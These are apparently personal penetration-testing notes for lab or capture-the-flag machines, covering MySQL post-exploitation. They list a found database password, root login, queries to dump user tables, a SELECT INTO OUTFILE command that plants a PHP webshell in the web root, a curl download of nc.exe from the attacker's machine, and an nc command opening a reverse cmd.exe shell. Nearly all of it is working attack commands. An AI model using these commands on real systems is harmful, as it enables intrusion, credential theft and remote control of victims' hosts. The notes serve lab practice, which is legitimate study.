found db/sql creds:
```
mysql -u lewis -p'P4ntherg0t1n5r3c0n##' joomla
```
- `P4ntherg0t1n5r3c0n##` is password goes between `-p''`
- `joomla` is name of database
default root sql creds:
```
mysql -h 10.10.13.141 -u root -p
```
- will prompt for password (press enter, default is blank)
```
show databases;
```
- look for one that isn't information_schema, mysql, performance_schema, phpmyadmin, or test
```
use news;
```
- select database from output of last query
```
show tables;
```
- looking for users or something else juicy
```
select * from users;
```
- show all users in table

if sql creds are for root user, check file write privilege:
```
select "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/xampp/htdocs/dev/shell.php';
```
- create php shell on hosted website
- go to url http://10.10.247.22/dev/shell.php?cmd=whoami
	- if you see nt authority\system, you have a root webshell
		- can transfer nc.exe from another low-privilege shell by setting up python server `python3 -m http.server 80` on kali machine and from low priv shell run `curl http://10.8.0.136/nc64.exe -o C:/Windows/Temp/nc.exe`
		- then start listener of kali machine and run `C:/Windows/Temp/nc.exe 10.8.0.136 2222 -e cmd.exe`